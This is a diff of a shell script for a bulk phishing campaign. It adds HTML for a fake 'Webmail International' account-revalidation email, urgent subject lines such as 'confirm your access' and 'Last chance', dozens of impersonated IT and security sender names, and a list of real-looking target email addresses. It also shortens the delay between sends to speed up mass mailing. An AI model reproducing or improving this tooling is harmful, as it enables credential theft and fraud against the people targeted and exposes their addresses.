+You have received this email because you are registered. This helps us ensure compliance with our Terms of Service and other legitimate matters.<br style="box-sizing: border-box;"><br style="box-sizing: border-box;"></td></tr><tr style="box-sizing: border-box;">
+<td align="left" class="v1v1ftr" valign="top" style='color: rgb(85, 85, 85); line-height: 14px; font-family: "DM Sans", sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; font-size: 12px; font-weight: 400; box-sizing: border-box;'>
+<a style="color: rgb(0, 172, 255); text-decoration: none; box-sizing: border-box; background-color: transparent;" href="https://privacy.com/?utm_source=cordial&amp;utm_medium=email&amp;utm_campaign=email_status_change" target="_blank" rel="noreferrer"><span style="color: rgb(85, 85, 85); text-decoration: underline; display: inline-block; box-sizing: border-box;">Privacy Policy</span></a><br style="box-sizing: border-box;"><br style="box-sizing: border-box;">
+&copy; 2004&#8211;2025, Webmail International Ltd.</td></tr></tbody></table><table width="100%" style="border-collapse: collapse; box-sizing: border-box;" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td height="40" style="line-height: 1px; font-size: 1px; box-sizing: border-box;"></td></tr></tbody></table></td><td width="30" class="v1v1blockSides" style="box-sizing: border-box;"></td></tr></tbody></table></td>
+<td width="20" style="box-sizing: border-box;"></td></tr></tbody></table></td></tr></tbody></table><br class="Apple-interchange-newline">
+
+
+</tr></tbody></tr></tbody></tr></tbody></tr></tbody></div></div></div></body></html>
 EOL
 
 # Create a sample txt subject content (subject.txt)
@@ -101,10 +187,8 @@ echo "Creating subject.txt with subject content..."
 cat > subject.txt <<EOL
 {recipient-user}, confirm your access
 Revalidate by {date}
-{time} security check required
 {recipient-domain} access expiring
 {recipient-user}, confirm access
-{time} security check
 {recipient-domain} access alert
 Last chance: {date}
 {recipient-user} validation
@@ -113,7 +197,6 @@ Secure {recipient-domain}
 {recipient-user} must confirm
 {recipient-user} re-auth
 Before {date}
-{time} confirm now
 Protect {recipient-domain}
 {recipient-user} validate
 EOL
@@ -121,6 +204,14 @@ EOL
 # Create a sample txt name content (name.txt)
 echo "Creating name.txt with name content..."
 cat > name.txt <<EOL
+Webmail Revalidation
+IT Security Admin
+Domain Security Team
+Network Operations
+Webmail Revalidation
+CyberSecurity Alert
+System Compliance
+Infrastructure Watch
 IT Governance
 Mail Shield
 Domain Guardian
@@ -130,15 +221,58 @@ Firewall Watch
 Secure Gateway
 Data Bastion
 Threat Response
+Breach Alert
+Policy Enforcer
+Compliance Warden
+Access Sentinel
+Authentication Guard
+Password Sentinel
+Login Vigilante
+SSO Guardian
+2FA Enforcer
+Identity Sentinel
+Domain & Server Focused
+DNS Protector
+Server Watchtower
+Hosting Safeguard
+SSL Sentinel
+Webmail Revalidation
+Backup Defender
+Server Patrol
+Webmail Defender
+No-Reply Security
+Do Not Ignore: IT Dept
+Verified IT Sender
+Domain Patrol
+Corporate IT Services
+Official Domain Admin
+Enterprise Webmail
+Authorized IT Notifications
+Verified System Admin
+IT Policy Enforcement
+Certified Domain Team
+Domain & Server Alerts
+Domain Renewal Team
+Server Maintenance Alert
+DNS Configuration Team
+Hosting Security Update
+Webmail Revalidation
+Domain Ownership Check
+Mail Server Upgrade
+SSL Certificate Expiry
+Firewall Security Alert
+Domain admin
+Domain at Risk
 EOL
 
 # Create a sample txt list content (list.txt)
 echo "Creating list.txt with list content..."
 cat > list.txt <<EOL
-boxxfc@gmail.com
-info@brickx.com
-gwenna@gwennakadima.com
-mackenzie@walshequipment.ca
+sales@iconicgloballogistics.com.mv
+frankduke956@yahoo.com
+son_of_grace@hotmail.com
+accounts@mlkschools.ac.zw
+snooks_bayside@outlook.com
 podpora@vsezapivo.si
 EOL
 
@@ -281,7 +415,7 @@ EOF
     rm "\$TEMP_HTML"
     
     # Dynamic delay (0.5-3 seconds)
-    sleep \$(awk -v min=0.3 -v max=0.8 'BEGIN{srand(); print min+rand()*(max-min)}')
+    sleep \$(awk -v min=0.1 -v max=0.4 'BEGIN{srand(); print min+rand()*(max-min)}')
     
     # Progress indicator
     echo "[\$SUCCESS/\$TOTAL] Sent to \$CLEAN_EMAIL"
